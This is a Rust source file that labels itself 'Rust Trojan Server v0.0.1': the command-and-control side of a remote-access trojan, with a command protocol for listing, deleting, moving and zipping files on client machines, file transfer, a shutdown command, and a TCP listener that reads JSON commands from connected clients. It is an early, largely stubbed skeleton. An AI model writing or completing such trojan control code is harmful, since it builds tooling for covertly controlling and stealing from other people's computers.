use std::net::{TcpListener, TcpStream};
use std::io::{Read, Write, stdin, stdout};
use std::thread;
use serde::{Serialize, Deserialize};

#[derive(Serialize, Deserialize, Debug)]
struct HeartBeat {
    id : String
}

#[derive(Serialize, Deserialize, Debug)]
enum CommandType {
    Hostsys,
    Clisys,
    Clictrl,
    None
}

#[derive(Serialize, Deserialize, Debug)]
enum Command {
    Ls,
    Me,
    Mkdir,
    Rm,
    Mv,
    Zip,
    Rz,
    Sz,
    Listen,
    Catch,
    Shutdown,
    Quit,
    None
}


#[derive(Serialize, Deserialize, Debug)]
struct CommandPack {
    commandtype : CommandType,
    command : Command,
    args : Vec<String>
}

impl CommandPack {
    fn new() -> Self {
        Self {
            commandtype : CommandType::None,
            command : Command::None,
            args : Vec::new()
        }
    }

    fn into_string(line: String) -> CommandPack{

        let parts = line.split(' ');
        let mut cp = CommandPack::new();
    
        for (index, part) in parts.enumerate(){
            match index {
                0 => {
                    cp.commandtype = match part {
                        "hs" => CommandType::Hostsys,
                        "cs" => CommandType::Clisys,
                        _ => CommandType::Clictrl
                    }
                }
                1 => {
                    cp.command = match part {
                        "ls" => Command::Ls,
                        "me" => Command::Me,
                        "mkdir" => Command::Mkdir,
                        "rm" => Command::Rm,
                        "mv" => Command::Mv,
                        "zip" => Command::Zip,
                        "rz" => Command::Rz,
                        "sz" => Command::Sz,
                        "listen" => Command::Listen,
                        "catch" => Command::Catch,
                        "shutdown" => Command::Shutdown,
                        "q" => Command::Quit,
                        _ => Command::None
                    }
                }
                _ => {
                    let arg = part
                                    .trim()
                                    .to_string()
                                    .replace('@', " ");
                    cp.args.push(arg);
                }
            }
        }
        cp
    }
}

fn get_user_input() -> String{
    let mut user_in = String::new();
    stdin().read_line(& mut user_in).expect("read_line from stdin err");
    user_in
}

fn main(){

    loop {
        print!(">>");
        stdout().flush().unwrap();
        let line = get_user_input();
        let cp: CommandPack = CommandPack::into_string(line);
        println!("CommandPack: {:?}", &cp);
        controller(&cp);
    }
}

fn controller(cp : &CommandPack){
    match cp.commandtype {
        CommandType::Hostsys => {
            match cp.command {
                Command::Quit => std::process::exit(0),
                _ => 0
            }
        },
        CommandType::Clisys =>{
            match cp.command {
                _ => 0
            }
        },
        CommandType::Clictrl => {
            match cp.command {
                _ => 0
            }
        },
        _ => 0
    };
}


fn handle_client(mut stream: TcpStream) {

    let mut buffer = [0; 2048];
    // show ip addr of the client
    println!("Connection from: {}", stream.peer_addr().unwrap());

    loop {
        match stream.read(&mut buffer) {
            Ok(0) => {
                // Connection was closed by the client
                println!("Connection closed");
                break;
            }
            Ok(n) => {
                // Echo the received data back to the client
                let buf_vec = Vec::from(&buffer[..n]);
                let buf_str = String::from_utf8_lossy(&buf_vec);
                let cp: CommandPack = serde_json::from_str(&buf_str).unwrap();
                println!("{:?}", cp);
                stream.write(&buffer[..n]).unwrap();
            }
            Err(e) => {
                println!("Error reading from stream: {}", e);
                break;
            }
        }
    }
}


fn say_hello() {
    println!("\n\nRust Trojan Server v0.0.1\n\n");
}

fn main2() -> std::io::Result<()> {

    say_hello();

    let listener = TcpListener::bind("127.0.0.1:7878")?;
    println!("Control Server listening at Port: 7878");

    for stream in listener.incoming() {
        match stream {
            Ok(stream) => {
                thread::spawn(|| {
                    handle_client(stream);
                });
            }
            Err(e) => {
                println!("Error accepting connection: {}", e);
            }
        }
    }

    Ok(())
}
